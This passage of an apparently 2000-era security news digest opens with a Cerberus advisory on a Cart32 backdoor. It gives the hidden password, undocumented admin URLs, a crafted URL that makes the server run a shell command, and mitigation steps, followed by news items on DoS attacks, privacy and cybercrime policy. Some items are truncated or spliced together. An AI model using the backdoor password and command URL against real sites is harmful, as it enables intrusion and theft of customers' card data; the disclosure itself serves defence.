      Description
      ***********
      The Cerberus Security Team has discovered a serious security hole in
      McMurtrey/Whitaker & Associates, Inc's Win32 e-Commerce shopping cart,
      namely, Cart32 (http://www.cart32.com/) that can only be described as a
      blatant backdoor. Within cart32.exe, the main file that provides the cart's
      functionality, there is a secret hidden password that can be used to gain
      vital information such as other passwords and using these an attacker can
      modify the shopping cart's properties so that arbitary commands may be run
      on the server as well as gain access to customers' credit card details,
      shipping addresses and other highly sensitive information.
      
      Details
      *******
      Within cart32.exe there is a secret backdoor password of "wemilo" (found at
      file offset 0x6204h) known internally as the Cart32Password. With knowledge
      of this password an attacker can go to one of several undocument URLs such
      as http://charon/scripts/cart32.exe/cart32clientlist and obtain a list the
      passwords for each Cart32 client. (A client is essentially a shop site).
      Although these passwords appear to be hashed they can still be used. For
      example they can be embedded in a specially crafted URL that will allow the
      attacker to prime the server to run an arbitrary command when an order is
      confirmed:
      
      http://charon/scripts/c32web.exe?TabName=Cart32%2B&Action=Save+Cart32%2B+Tab
      &SaveTab=Cart32%2B&Client=foobar
      &ClientPassword=e%21U%23_%25%28%5D%5D%26%25*%2B-a&Admin=&AdminPassword=&TabT
      oSave=Cart32%2B&PlusTabToSave=
      Run+External+Program&UseCMDLine=Yes&CMDLine=cmd.exe+%2Fc+dir+%3E+c%3A%5Cfile
      .txt
      
      This URL will set the cart's properties to spawn a shell, perform a
      directory listing and pipe the output to a file called file.txt on the root
      of the C: drive when an order is confirmed. After doing this the attacker
      would then create a spurious order and confirm it thus executing the
      command. (Please note that the above URL is pertinent only to an internal
      Cerberus server - password details and client info would need to be changed
      to reflect the site in question).
      
      Further to this the Cerberus Security Team has found what is, perhaps, a
      second backdoor. By going directly to the following URL
      http://charon/scripts/c32web.exe/ChangeAdminPassword it is possible to
      change the administrative password with out knowledge of the previous one.
      
      
      Solution
      ********
      Cerberus recommends that the following steps be actioned immediately.
      Cerberus has tested this in their labs and the Cart functionality will not
      be broken by following these steps.
      
      1) Download a Hex Editor such as UltraEdit (http://www.ultraedit.com) and
      edit cart32.exe changing the "wemilo" password to something else. This will
      address the first issue.
      
      2) Because c32web.exe is the administration program for Cart32 only site
      administrators will need access to it. Set the NTFS permissions on this file
      so that only Administrators have access to it. This way anyone attempting to
      access this file to change the admin password will be prompted for an NT
      account and password. For other "servers" such as Windows 95 and 98 Cerberus
      recommends removing this file.

122.0 [HNN] FBI Investigating AboveNet DoS 
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

     contributed by root66 
     The FBI is investigating a denial of service attack that hit San
     Jose-based AboveNet Communications Inc. on Tuesday. According to
     AboveNet the attack was directed at a network device called a customer
     aggregation switch. The problem lies within AboveNet's methodologies
     as opposed to a vulnerability within the switch said a representative
     of AboveNet.

      FBI investigates cyberattack against AboveNet 

      By Ann Harrison       04/27/2000 As investigators continue to search for 
      attackers who temporarily shut down eight e-commerce sites in February, 
      another company was hit by a different type of denial-of-service attack 
      Tuesday. 

      The FBI is investigating a denial-of-service attack launched against San 
      Jose-based AboveNet Communications Inc. that blocked traffic to almost a 
      thousand content and service providers. 

      
      FBI spokeswoman Deb Weierman said the bureau is looking into the AboveNet 
      incident "to see what activity went on." However, she added that because 
      it is an ongoing case, she couldn't divulge any details about the 
      investigation. 

      Unlike the earlier distributed denial-of-service attacks that flooded 
      e-commerce sites with false data traffic, this attack was directed against 
      a switch in AboveNet's network. AboveNet's Internet Service Exchange (ISX) 
      network provides co-location services and Internet connectivity to 
      companies such as NetZero Inc., CNet Inc. and America Online Inc., which 
      wasn't affected by the outage. 

      "This wasn't just a teen-ager with a $300 Linux machine. This was someone 
      who had time to learn the trade," said Paul Vixie, senior vice president 
      of Internet services at Metromedia Fiber Network Inc. in White Plains, 
      N.Y., AboveNet's parent company. "It was certainly severe; most of our 
      customers were impacted for a period of hours." 

      According to Vixie, the attack was directed at a network device called a 
      customer aggregation switch. The switch bundles co-location customers at 
      the company's ISX facilities and links them to an Internet backbone as one 
      high-speed connection. Vixie said the attack hit three switches at the 
      company's ISX facilities in New York, Vienna, Va., and San Jose. 

      The switch is made by Cisco Systems Inc., but Vixie said the exploit had 
      nothing to do with a defect in the switch. He said the attacker exploited 
      a flaw in the switch's configuration management process that the company 
      has since changed. 

      "There are certainly good and bad ways to do that. We thought we were 
      using a good way, and (this week) we found out that we weren't," said 
      Vixie. "The hole closed was in the process, not in the product." 

      
      Stephen Northcutt, director of the Global Incident Analysis Center for the 
      SANS Institute, declined to comment on the specifics of the AboveNet case. 
      But he said the real problem isn't the attacks but what can be done about 
      them. "We're focusing on the wrong thing," Northcutt said. "We're focusing 
      on the actual attack. What we need to focus on are the systems that are 
      being compromised every day." 

      Vixie said he believes there is little opportunity for copycat attacks 
      because of the unique methods AboveNet used to manage its network. The 
      company suffered rolling outages from mid-morning Pacific time on Tuesday 
      to mid-afternoon. According to Vixie, many customers had alternative 
      carriers that ensured their network traffic got through  a common 
      fail-over strategy for high-end customers. Very large customers, such as 
      AOL, whose traffic wasn't funneled through the aggregation switch, weren't 
      impacted. 

      Vixie advised other information technology mangers who may be concerned 
      with the management of their switches to consult with their vendors on 
      proper switch management and configuration. He said swift action is also 
      needed to deflect such attacks. Close network monitoring revealed the 
      connectivity loss to customers, and AboveNet launched an investigation 
      immediately. "We used brute force," said Vixie. "We called everyone in on 
      the shift and went through the network with a fine-tooth comb, not only to 
      get everyone back up online, but to make sure there were no time bombs." 
      He added that no backdoors or other delayed exploits were detected. 

      Vixie says the company has speculated widely as to the motive for the 
      attack and concluded that it could have emerged from one of two 
      "completely useless categories." One category includes competitors that 
      the company took a customer away from, disgruntled former employees or 
      customers who had been disconnected because they were spamming. The other 
      category, said Vixie, includes "someone who has something to prove and 
      wants to bring our network down and wants to brag about it." 

      The denial-of-service attacks launched in February have proved difficult 
      to trace because of the sheer volume of the attacks and the fact that 
      targeted sites weren't able to capture attack data during the incident. 
      But Vixie said the FBI has a reasonable chance of catching his company's 
      attacker, partly because AboveNet has put resources into filtering, 
      logging and traffic analysis. "We did not come away from (Tuesday's) 
      experience completely ignorant," said Vixie. 

      The February attacks against eight large e-commerce sites appeared to 
      involve known attack tools such as Tribe Flood Network and Trinoo, which 
      use co-opted machines to send a storm of packets against targeted sites 
      (see story). Vixie said that because of the ongoing investigation, he 
      couldn't say whether known exploits were used in the AboveNet attack. 

      A 15-year-old Canadian, who allegedly calls himself Mafiaboy, was arrested 
      April 15 by the Royal Canadian Mounted Police and charged in connection 
      with a February denial-of-service attack against the CNN Web site. He was 
      charged with two counts of mischief to data, but security analysts believe 
      he likely wasn't responsible for the other attacks (see story). An 
      investigation is ongoing, but no other suspects have yet been named.

123.0 [HNN] Intel Removes ID Feature From New Chips 
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      April 28th
       
     
     contributed by Evil Wench
     Intel has decided to remove the controversial ID-tracking technology
     from its next generation PC processor. The ID was included in Pentium
     III chips as a way to help facilitate e-commerce solutions. Intel says
     the increase in the technology of digital signatures lead them to this
     decision. (Yeah, the bad press and the boycott had nothing to do with
     it.)

      Intel disables ID tracking in new chips

      There was a firestorm of protest when Intel put ID-tracking technology in 
      Pentium III chips. Now it's obsolete and being removed.

      By Robert Lemos, ZDNet News       April 27, 2000 12:40 PM PT 

      Intel Corp. says it plans to remove the controversial processor-ID 
      technology from its next-generation PC processor and from future 
      processors, ending a year-long battle with privacy advocates over the 
      invasive technology.       "We made the decision earlier this year," said 
      George Alfs, a spokesman for Intel (Nasdaq: INTC) said Thursday. "We are 
      not planning for (the chip ID) in our next processor." 

      Alfs said the rise of digital-signature technology has made the need for 
      chip IDs obsolete.

      As first reported on ZDNet News more than a year ago, the inclusion of the 
      chip ID in the Pentium III processor touched off a heated controversy with 
      privacy advocates denouncing the technology as an attempt to track users 
      on the Internet. 

      Calls for boycott       Originally, Intel intended to ask PC makers to 
      ship machines with the processor ID "on" -- that is, accessible to 
      software -- but later changed tack by supplying a utility to customers to 
      turn the feature on and off. Still not satisfied, however, privacy 
      advocates and policy analysts called for a boycott of the chip maker.

      The boycott may have gone a long way to decide the issue, said Jason 
      Catlett, president of pro-privacy Junkbusters Corp. "The thing that I am 
      very glad didn't happen was for the feature to go into the food chain of 
      the operating system, browser and e-commerce sites. The boycott probably 
      cut off a lot of the proliferation that could have happened."

      Intel, however, said privacy arguments were less of a factor in the 
      decision than digital-signature technology. "The technology has moved 
      quite quickly," Alfs said. "With digital signatures you can do a lot of 
      the functions that we had envisioned doing with the processor serial 
      number." Its uses could have included authenticating customers for 
      e-commerce, secure network management and secure e-mail.

      Security features panned       However, some security experts and privacy 
      advocates said the chip could not really add such security features at 
      all.

      "Unfortunately, it doesn't do any of these things," wrote Bruce Schneier, 
      president of Counterpane Internet Security Inc. in a ZDNet column. "If a 
      remote Web site queries a processor ID, it has no way of knowing whether 
      the number it gets back is a real ID or a forged ID."

      Intel won't stop adding security features, however. Its current 
      motherboard chip sets include a random-number generator, which helps 
      strengthen software encryption on the PC. That will stay, Alfs said.

      Don't look for any more boycotts, however. Privacy proponents love 
      stronger encryption.

      Microsoft zaps Hotmail password bug By Paul Festa Staff Writer, CNET 
      News.com April 27, 2000, 12:30 p.m. PT Microsoft has patched a Hotmail bug 
      that left users of the Web-based email service vulnerable to a 
      password-stealing trick.

      The exploit was the latest in a series devised by bug hunters using 
      JavaScript to launch fraudulent password  

      entry screens to trick people into handing over control of their accounts. 

      JavaScript is a Web scripting language designed to take actions on a Web 
      site visitor's computer, such as launching a new window or scrolling text 
      across the screen, without the visitor's interaction. After the first few 
      password-stealing schemes came to light, Hotmail and other Web email 
      providers decided to filter JavaScript from incoming messages. 

      But bug hunters have kept themselves busy finding ways to sneak the code 
      around Hotmail's filters. 

      In the example addressed by Hotmail this week, Bulgarian bug hunter Georgi 
      Guninski demonstrated a way to inject JavaScript through a style tag. The 
      exploit worked only with Microsoft's Internet Explorer browser. 

      In response to news of the bug, Microsoft this week patched the Hotmail 
      servers.

      program is installed on a laptop carried by a roaming human judge and 
      helps to assess swiftly and methodically witness reports and forensic 
      evidence at the scene of an incident. It then issues on-the-spot fines and 
      can even recommend jail sentences. 
      
      I know that this is a little bit different, but it works

      Judge Pedro Valls Feu Rosa        The software is being tested by three 
      judges in the state of Espirito Santo. It is part of a scheme called 
      Justice-on-Wheels, which is designed to speed up Brazil's overloaded legal 
      system by dealing immediately with straightforward cases. 

      Most people are happy to have the matters sorted out on the spot, says the 
      program's creator, Judge Pedro Valls Feu Rosa, who sits in the state's 
      Supreme Court of Appeals. He adds that the idea is not to replace judges 
      but to make them more efficient. 

      Pure logic 

      After police alert the rapid justice team to minor accidents, they can be 
      on the scene within 10 minutes. Most cases require only simple questions 
      and no interpretation of the law - the decision-making process is purely 
      logical, Judge Feu Rosa claims in New Scientist magazine. 

      The program, written in the Visual Basic language, presents the judge with 
      multiple choice questions, such as "Did the driver stop at the red light?" 
      or "Had the driver been drinking alcohol above the acceptable limit of the 
      law?" 
      
      The Electronic Judge asks questions . . .

      These sorts of questions need only yes or no answers, says Judge Feu Rosa: 
      "If we are concerned with nothing more than pure logic, then why not give 
      the task to a computer?"       He notes that the program gives more than a 
      simple judgement: it also prints out its reasoning. If the human judge 
      disagrees with the decision it can simply be overruled. 

      He admits, however, that some people who have been judged by the program 
      do not realise that they have been tried by software. 

      
      . . . . and then delivers judgement.

      It could be some time before a similar system takes the place of an 
      English court. "It would have to satisfy the authorities that it was 
      absolutely foolproof first," says a spokesman for the Lord Chancellor's 
      office, which oversees courts in England and Wales.       But it could be 
      put to use in the US, where Judge Feu Rosa says he is in discussion with 
      insurance companies to set up a mobile system to resolve disputes over 
      traffic accidents.

      Mitnick Muzzled Ex-hacker plans his return to court after his ban on 
      computing is extended to speaking and writing. By Kevin Poulsen April 25, 
      2000 2:13 AM PT

      Kevin Mitnick has been yanked off the lecture circuit and ordered by the 
      U.S. Probation Office to halt his professional writing efforts, a move 
      that left a recent Salt Lake City computer conference without its star 
      speaker, and magazine publisher Steven Brill short one media critic for 
      his upcoming web offering.

      "In regards to the numerous requests you have received concerning writing 
      and critiquing articles and speaking at conferences, we find it necessary 
      to deny your participation and recommend that you pursue employment in a 
      non-related field," reads an April 12th letter to Mitnick from the 
      Ventura, California U.S. Probation Office that supervises him.

      "Right now, I've retained counsel to go ahead and try to get this 
      clarified," Mitnick said Monday. "I'm surprised, because all I was trying 
      to do through my writing and speaking was to tell people how information 
      security is important."

      Mitnick is arguably the world's most well-known hacker. His current 
      notoriety came after he cracked a string of computers at cell phone 
      companies, universities and ISPs. He pleaded guilty in March, 1999 to 
      seven felonies, and was released from prison on January 21st, 2000 after 
      nearly five years in custody.

      In February, Mitnick testified before a Senate committee about U.S. 
      government computer security. The same month, he wrote a five-hundred-word 
      commentary for Time Magazine opining on the high-profile denial of service 
      attacks that briefly struck down some of the most widely used e-commerce 
      sites on the web. 'I'm helping to protect people from the very conduct 
      that I was once engaged in'       -- Kevin Mitnick A disclaimer under his 
      article noted that it "should not be construed as technical advice of any 
      kind," a nod to special restrictions federal judge Marianna Pfaelzer 
      handed Mitnick as part of a 1997 sentence for cell phone fraud. Under that 
      ruling, Mitnick is not only banned for three years from using computers, 
      cell phones and the Internet, but he's barred from acting "as a consultant 
      or advisor to individuals or groups engaged in any computer related 
      activity," without the permission of the U.S. Probation Office.

      Until this month, the Probation Office apparently didn't interpret that 
      broad order -- which was upheld by an appeals court in 1998 -- as an 
      obstacle to Mitnick's career ambitions. 

      "I wanted to work on a book," says Mitnick. "I wanted to work in these 
      speaking engagements and articles, and it was something that was 
      satisfying to me and something I could do" without using computers.

      One source says that Mitnick had as much as $20,000 worth of speaking 
      engagements scheduled through August, when the April 12th decision put his 
      plans in limbo, and forced him to cancel a scheduled appearance last week 
      on an information security panel in Salt Lake City, Utah.

      Brill's Discontent       Mitnick said he warned organizers of the Utah 
      NetTrends 2000 computer conference from the start that his appearance 
      would hang on the Probation Office's approval, and he's miffed that a 
      press release issued by the conference incorrectly claimed that a last 
      minute court ruling caused the cancellation.

      In addition to speaking engagements, Mitnick had been entertaining more 
      offers to write for a variety of newspapers, magazines and web sites, and 
      had agreed to author a monthly column for Contentville, an e-commerce site 
      set to begin reviewing and selling books and magazines this summer. 

      "I wanted Kevin to write about consumer computer magazines," said Michael 
      Hsu, the Contentville editor who recruited Mitnick. "His situation, where 
      he can't touch computers or use cell phones, is unique, and I thought he 
      could bring an interesting perspective.

      "From what I've been told about it, [the restriction] doesn't make any 
      sense, and I think if he has the legal resources he should be able to 
      challenge it successfully," said Steven Brill, Editor in Chief of the 
      media watchdog magazine Brill's Content, and founder of Contentville. 

      Brill said it's one thing to prevent a defendant from profiting from his 
      crimes... "It's quite another thing to say he can't talk to anyone about 
      anything. It just doesn't make any sense," said Brill, who still holds 
      some hope that Mitnick will be writing for Contentville. "If he is not 
      going to be able to do it, I'd be very disappointed,"

      "The government can impose any restrictions so long as they are reasonably 
      related to sentencing goals, and are no more restrictive then necessary," 
      says Eugene Volokh, a UCLA Law School professor and expert in First 
      Amendment issues. "Off the top of my head, it's hard for me to imagine how 
      banning him from writing about computer magazines is consistent with those 
      goals. But I haven't heard the probation officer's point of view"

      Reginald Valencia, Supervising United States Probation Officer, said 
      office confidentiality rules prevent him from commenting on the case. "Not 
      in any shape manner or form could I discuss it," said Valencia.

      Volokh notes that sentencing judges and probation officers are generally 
      afforded great discretion in imposing supervision restrictions.

      Mitnick acknowledges his chances are poor if he takes his fight up to the 
      appellate courts, but he adds that he and his new attorney, Los Angeles 
      criminal defense lawyer Sherman Ellison, don't plan on entering Judge 
      Pfaelzer's courtroom sprouting case law and statutes.

      "I'm helping to protect people from the very conduct that I was once 
      engaged in," said Mitnick. "We're going to go in there and explain to the 
      judge that this is good for the public and good for my rehabilitation."

131.0 [HNN] MI5 To Build Email Eavesdropping Center

     contributed by Weld Pond 
     British security agency MI5 will be constructing a 25m email
     surveillance center to monitor all emails sent and received in
     Britain. While law enforcement will still need Home Office approval to
     actually read emails and other messages officials say the center is
     need in the fight against online crime. the new center will be called
     GTAC, Government Technical Assistance Centre and will be operational
     by the end of the year.

      MI5 builds new centre to read e-mails on the net 

      Nicholas Rufford 

      MI5 is building a new £25m e-mail surveillance centre that will have the 
      power to monitor all e-mails and internet messages sent and received in 
      Britain. The government is to require internet service providers, such as 
      Freeserve and AOL, to have "hardwire" links to the new computer facility 
      so that messages can be traced across the internet.       The security 
      service and the police will still need Home Office permission to search 
      for e-mails and internet traffic, but they can apply for general warrants 
      that would enable them to intercept communications for a company or an 
      organisation. 

      The new computer centre, codenamed GTAC - government technical assistance 
      centre - which will be up and running by the end of the year inside MI5's 
      London headquarters, has provoked concern among civil liberties groups. 
      "With this facility, the government can track every website that a person 
      visits, without a warrant, giving rise to a culture of suspicion by 
      association," said Caspar Bowden, director of the Foundation for 
      Information Policy Research. 

      The government already has powers to tap phone lines linking computers, 
      but the growth of the internet has made it impossible to read all 
      material. By requiring service providers to install cables that will 
      download material to MI5, the government will have the technical 
      capability to read everything that passes over the internet. 

      Home Office officials say the centre is needed to tackle the use of the 
      internet and mobile phone networks by terrorists and international crime 
      gangs.Charles Clark, the minister in charge of the spy centre project, 
      said it would allow police to keep pace with technology. 

      "Hardly anyone was using the internet or mobile phones 15 years ago," a 
      Home Office source said. "Now criminals can communicate with each other by 
      a huge array of devices and channels and can encrypt their messages, 
      putting them beyond the reach of conventional eavesdropping." 

      There has been an explosion in the use of the internet for crime in 
      Britain and across the world, leading to fears in western intelligence 
      agencies that they will soon be left behind as criminals abandon the 
      telephone and resort to encrypted e-mails to run drug rings and illegal 
      prostitution and immigration rackets. 

      The new spy centre will decode messages that have been encrypted. Under 
      new powers due to come into force this summer, police will be able to 
      require individuals and companies to hand over computer "keys", special 
      codes that unlock scrambled messages. 

      There is controversy over how the costs of intercepting internet traffic 
      should be shared between government and industry. Experts estimate that 
      the cost to Britain's 400 service providers will be £30m in the first 
      year. Internet companies say that this is too expensive, especially as 
      many are making losses. 

      About 15m people in Britain have internet access. Legal experts have 
      warned that many are unguarded in the messages they send or the material 
      they download, believing that they are safe from prying eyes. 

      "The arrival of this spy centre means that Big Brother is finally here," 
      said Norman Baker, Liberal Democrat MP for Lewes. "The balance between the 
      state and individual privacy has swung too far in favour of the state."

      Northwest's Plans vs. Cybercrime by Manny Frishberg 3:00 a.m. Apr. 28, 
      2000 PDT 

      
      SEATTLE -- Federal, state, and local agencies are teaming up to combat 
      cybercrimes in the Pacific Northwest, hoping that the joint effort will 
      prove stronger than the abilities of individual agencies, whose resources 
      frequently are dwarfed by the magnitude of their challenges. 

      Washington state Attorney General Christine Gregoire, who announced the 
      program Thursday, said she hoped it would serve as a model for law 
      enforcement agencies around the country. 

      The CLEW agreement, or Computer Law Enforcement of Washington, was signed 
      by the heads of the respective agencies in early March, but was not made 
      public until Gregoire's press conference Thursday. 

      The program will streamline efforts to combat Internet crimes, said U.S. 
      Attorney Kate Pflaumer, adding that a lag in technological resources only 
      adds to cooperation problems between states and countries. 

      "The Internet does not recognize state or even national political 
      boundaries, so cooperation between law enforcement is imperative," she 
      said. 

      Starting with an agreement to cooperate and share existing resources, 
      Gregoire said the agencies will seek $2 million from the U.S. Department 
      of Justice and the Treasury to equip and expand the program. 

      In addition to providing computers and technicians who can tease data out 
      of computer systems and hard drives, the program will train law 
      enforcement personnel to seize computers and components using methods that 
      preserve their data. 

      Gregoire, flanked by the area's U.S. attorney, the head of the local FBI 
      office and the Tacoma city attorney, said she's pressing Congress to pass 
      legislation that would clarify where a crime has been committed when a Web 
      server is in one state and the person accessing the system is in another. 

      The group also hopes to establish uniform rules for getting search 
      warrants for Internet-based and computer data that would be respected by 
      all the states, so that a search warrant from Washington state could be 
      used to seize a server in Arizona, said Pierce County Prosecuting Attorney 
      John Landenburg. 

      With the Anarchist Cookbook home page projected onto a screen behind her, 
      Gregoire launched into a set of statistics to illustrate the scale of the 
      problem. 

      Eighty-five percent of all Internet bulletin board traffic is dedicated to 
      hacking, software piracy, or sex, Gregoire said, citing a New York Times 
      article. 

      In a recent FBI study of Fortune 500 companies, reported losses from 
      computer crime between 1997 and 1999 exceeded $360 million, and 62 percent 
      of those companies reported a computer security breach within the last 
      year, she added. 

      Landenburg, who's assembled a computer forensics lab for his area, said he 
      was concerned that 37 out of 38 jurisdictions in the state don't have the 
      resources to follow Tacoma's lead. 

      Landenburg said he still has problems keeping up with the pace of change 
      in the computer industry. "Every year we have to go out and replace our 
      equipment" to match that of the people the lab is investigating, he said. 

      In another component to the program, the University of Washington will 
      help out with a new Web-based center to handle consumer complaints and 
      mediate e-commerce disputes, Gregoire said.

     A new tool has joined the ranks of the old standbys in distributed DoS
     attacks. Now not only is their Trinoo, TFN and Stacheldraht tools
     there is mStream. mStream was recently discovered on a compromised
     Linux system in the wild. Initial analysis shows the program to be in
     the early stages of development however it has the potential to be
     much more powerful than existing tools.

     So how many attempted cyber attacks do DOD computers fend off each
     year? Depends on who you listen to and what you call an attack I
     guess. It would appear that some officials don't know the difference
     between a network query and an attempted intrusion. It would seem from
     the numbers that attacks (network queries, intrusions, ???) against
     DOD ranged somewhere between 58 and 250,000 for 1999.

      Intercepts BY Dan Verton 05/01/2000 The Hacker Equation 

      My mobile listening posts have discerned a confusing pattern of reports on 
      the number of hacker "attacks" launched against the Defense Department 
      each year. 

      It started out simple enough: Early last year, Air Force Maj. Gen. John 
      "Soup" Campbell, commander of the Joint Task Force for Computer Network 
      Defense, placed the number of "attacks" against DOD networks at 250,000 
      each year. 

      But in November 1999, Lt. Gen. David Kelley, director of the Defense 
      Information Systems Agency, talked about a 300 percent increase in the 
      number of "unauthorized intrusions." 

      Intrusions skyrocketed, according to Kelley, from 5,844 in 1998 to 18,433 
      through November 1999. (Campbell reported last week that this number 
      topped off at 22,144 for all of 1999.) 

      This year the numbers got more complicated. In March, Lt. Col. LeRoy 
      Lundgren, program manager for the Armys National Security Improvement 
      Program, said the Army alone denied as many as 285,000 network queries 
      last year because of questionable methods used in the queries. The 
      Interceptor guesses "network queries" are somehow similar to "attacks." 

      Enter the Justice Department. According to Justice, the number of hacking 
      cases throughout the government nearly doubled last year, reaching 1,154, 
      up from 547 in 1998. One look at these numbers and you have to wonder if 
      these guys even know that DOD is part of the federal government. 

      Then, of course, there are "incidents" and "intrusions" to deal with. Lt. 
      Gen. William Campbell, the Armys chief information officer, last week 
      told a crowd at the Association of the U.S. Armys annual symposium on 
      information assurance and battlefield visualization that the Army 
      experienced 3,077 "incidents" during fiscal 1999 and 58 "intrusions." For 
      fiscal 2000, those numbers had reached 2,230 and 40, respectively, by 
      April 4. 

      But "Soup" Campbell told the same crowd that in fiscal 1998 a total of 
      5,844 incidents were reported to the Pentagon by DOD commands. In fiscal 
      1999, that number reached 22,144, and during the first three months of 
      this year, that number had already surpassed 5,993, Campbell said. 

      Confused? I am. 

      Serving Campbell Soup at the CIA 

      "Soup" Campbell told the Interceptor last week that hes received orders 
      to report in June to CIA headquarters, where he will take over as the 
      director of military support. Speaking at the AUSA symposium, Campbell 
      also said the JTF-CND recently added legal counsel to its official 
      structure. 

      "I never thought Id need a lawyer to do my business," Campbell said, 
      referring to the lack of legal guidelines governing computer network 
      attack and defense. 

      Hey, dont knock it, Soup. Legal counsel is highly underrated in this 
      world of error-prone databases and outdated hard-copy maps. 

      Fortunately, I hear that theres no shortage of lawyers in Langley, Va. 

      
      Go West, Young Man 

      My E-Ring listening post in the heart of the Pentagon has picked up 
      several low-level signals indicating that Paul Brubaker, the Defense 
      Departments acting deputy chief information officer, plans to leave his 
      position in a matter of weeks. 

      A strong supporter of the Navy/Marine Corps Intranet proposal, Brubaker 
      has apparently succumbed to "dot-com fever," according to sources, and 
      will be zapping himself out to the West Coast after he checks out of DOD. 
      One N/MCI insider said he hoped the move "is not a harbinger of the 
      future" for the beleaguered program.

      Hacker demanded HK$500 for chatroom password ELAINE PAK LI 

      
      --------------------------------------------------------------------------
      ------ A computer hacker was behind bars last night after breaking into a 
      man's on-line chatroom account, changing his password and demanding HK$500 
      to change it back. When Lee Kei, 21, found that his account's password had 
      been changed by computer technician Cheng Tsz-chung in July last year, he 
      opened another account to enter the chatroom and discuss the matter with 
      the hacker, Eastern Court heard. 

      During their on-line exchanges, Cheng, 22, tested Mr Lee's computer 
      knowledge by asking him several complicated questions, none of which Mr 
      Lee could answer, the court heard. 

      Cheng then refused to release Mr Lee's account, instead offering to sell 
      it back to him. The victim deposited $500 into Cheng's bank account the 
      next day and reported the matter to police. 

      Cheng was arrested in March when he was coincidently stopped and searched 
      by a police officer in Tsim Sha Tsui, the court heard. 

      He pleaded guilty to one charge of unauthorised access to a computer and 
      two counts of theft. 

      Cheng's lawyer told Magistrate Ian Candy that his client, who had no 
      previous criminal record, committed the offences "just for fun". 

      Mr Candy said: "Not only did you break into another person's account and 
      use it yourself, you even asked for money when you were discovered." 

      The magistrate remanded Cheng in custody and said his sentence, which will 
      be handed down on May 10 pending reports, must have a deterrent effect.

     The Global Positioning System has been purposely crippled for civilian

     civilians should get the same use of GPS as the military by disabling
     the degradation of the signal or Selective Availability. Degradation
     of the civilian signal was originally to prevent foreign nations from
     having the same advantage as us but the US has demonstrated the
     capability to selectively deny GPS signals on a regional basis during
     times of conflict so the Selective Availability is no longer
     necessary. The removal of Selective Availability will increase
     Civilian GPS accuracy from 100 to 10 or 20 meters. (Wow, this should
     mean some real cool GPS products should hit the market soon.) the

                              STATEMENT BY THE PRESIDENT
      
      
      Today in Algiers, Ethiopia and Eritrea signed an agreement to cease
      hostilities.  This is a breakthrough which can, and should  end the tragic
      conflict in the Horn of Africa.  It can, and should permit these two
      countries to realize their potential in peace, instead of squandering it in
      war.
      
      I commend the Organization of African Unity, and especially its chair
      Algerian President Abdelaziz Bouteflika, for leading the negotiation of
      this agreement.  I am grateful to my envoy, former National Security
      Advisor Anthony Lake, to Assistant Secretary of State Susan Rice and to my
      senior advisor on African Affairs Gayle Smith for their tireless pursuit of
      a peaceful resolution to this conflict.  The United States has  supported
      the OAU in this effort and we will continue to do so.  I have asked Tony
      Lake to return to Algiers to work with the OAU as we enter the next round
      of negotiations.
      
      I hope this commitment by Ethiopia and Eritrea to stop the fighting also
      signals their commitment to build the peace.  I urge them to use the next
      round of talks to produce a final, comprehensive, lasting agreement, so
      they can get on with the work of pursuing democracy and development for
      their people.  Ethiopia and Eritrea are America?s friends.  If they are
      ready to take the next step, we and our partners in the international
      community will walk with them.

      Civil GPS accuracy boosted BY Paula Shaki Trimble 

      
      What is GPS?

      GPS is a system of at least 24 orbiting satellites operated by the Defense 
      Department that provides accurate positioning and timing information to 
      users on the ground, in the air or in space. GPS is used to guide 
      missiles, navigate civilian aircraft and time cellular communications 
      handoffs from one base station to another. 

       
      05/02/2000 President Clinton on Monday delivered on a 4-year-old promise 
      to improve the accuracy of the Global Positioning System to civil users. 

      In a presidential directive in 1996, Clinton promised to revisit the issue 
      of intentionally degrading the civil GPS signal in 2000. He had promised 
      to discontinue use of the degradation capability  known as selective 
      availability  by 2006, with an annual assessment of its continued use 
      beginning this year. 

      Selective availability was deactivated at midnight on Monday, the 
      presidents science adviser, Neal Lane, announced during a press briefing 
      earlier in the day. 

      The decision came early because the Defense Department has sufficiently 
      proven its ability to deny the GPS signal to adversaries in a specific 
      region while maintaining availability to users elsewhere, said Arthur 
      Money, the Pentagons assistant secretary of Defense for command, control, 
      communications and intelligence. 

      Selective availability caused the civil GPS signal to be accurate within 
      100 meters. Without selective availability, users will receive position 
      information accurate within 10 to 20 meters. 

      While the modification significantly improves the accuracy of the GPS 
      signal, the Transportation Department is still committed to developing 
      systems that augment the GPS capability, said Eugene Conti, assistant 
      secretary of Transportation for transportation policy. Those systems, such 
      as the Federal Aviation Administrations Wide-Area Augmentation System and 
      Local-Area Augmentation System and the Coast Guards National Differential 
      GPS System, verify that the GPS signal is reliable.

      Cybercrime Solution Has Bugs by Declan McCullagh 3:00 a.m. May. 3, 2000 
      PDT 

      
      WASHINGTON -- U.S. and European police agencies will receive new powers to 
      investigate and prosecute computer crimes, according to a preliminary 
      draft of a treaty being circulated among over 40 nations. 

      The Council of Europe's 65KB proposal is designed to aid police in 
      investigations of online miscreants in cases where attacks or intrusions 
      cross national borders. 

      But the details of the "Draft Convention on Cybercrime" worry U.S. civil 
      libertarians. They warn that the plan would violate longstanding privacy 
      rights and grant the government far too much power. 

      The proposal, which is expected to be finalized by December 2000 and 
      appears to be the first computer crime treaty, would: 

      
      Make it a crime to create, download, or post on a website any computer 
      program that is "designed or adapted" primarily to gain access to a 
      computer system without permission. Also banned is software designed to 
      interfere with the "functioning of a computer system" by deleting or 
      altering data. 

      
      Allow authorities to order someone to reveal his or her passphrase for an 
      encryption key. According to a recent survey, only Singapore and Malaysia 
      have enacted such a requirement into law, and experts say that in the 
      United States it could run afoul of constitutional protections against 
      self-incrimination. 

      
      Internationalize a U.S. law that makes it a crime to possess even digital 
      images that "appear" to represent children's genitals or children engaged 
      in sexual conduct. Linking to such a site also would be a crime. 

      
      Require websites and Internet providers to collect information about their 
      users, a rule that would potentially limit anonymous remailers. 

      U.S. law enforcement officials helped to write the document, which was 
      released for public comment last Thursday, and the Justice Department is 
      expected to urge the Senate to approve it next year. Other non-European 
      countries actively involved in negotiations include Canada, Japan, and 
      South Africa. 

      During recent testimony before Congress, Attorney General Janet Reno 
      warned of international computer crime, a claim that gained more 
      credibility last month with the arrest of alleged denial-of-service 
      culprit Mafiaboy in Canada. 

      "The damage that can be done by somebody sitting halfway around the world 
      is immense. We have got to be able to trace them, and we have made real 
      progress with our discussions with our colleagues in the G-8 and in the 
      Council of Europe," Reno told a Senate appropriations subcommittee in 
